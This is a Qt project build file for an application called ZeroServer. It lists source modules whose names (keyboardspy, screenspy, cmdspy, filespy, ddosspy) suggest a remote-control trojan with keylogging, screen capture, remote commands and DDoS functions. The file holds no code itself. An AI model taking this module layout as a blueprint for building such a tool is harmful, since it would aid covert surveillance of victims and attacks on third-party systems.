#-------------------------------------------------
#
# Project created by QtCreator 2017-12-18T15:52:26
#
#-------------------------------------------------

QT       += core gui network

greaterThan(QT_MAJOR_VERSION, 4): QT += widgets

TARGET = ZeroServer
TEMPLATE = app


SOURCES += main.cpp\
        widget.cpp \
    tcpserver.cpp \
    tcpsocket.cpp \
    zeroserver.cpp \
    zeroclient.cpp \
    screenspy.cpp \
    keyboardspy.cpp \
    filespy.cpp \
    filetransfer.cpp \
    cmdspy.cpp \
    ddosspy.cpp

HEADERS  += widget.h \
    tcpserver.h \
    tcpsocket.h \
    zeroserver.h \
    zeroclient.h \
    screenspy.h \
    keyboardspy.h \
    filespy.h \
    filetransfer.h \
    cmdspy.h \
    ddosspy.h

FORMS    +=

RESOURCES += \
    resources.qrc

RC_FILE += winapp.rc
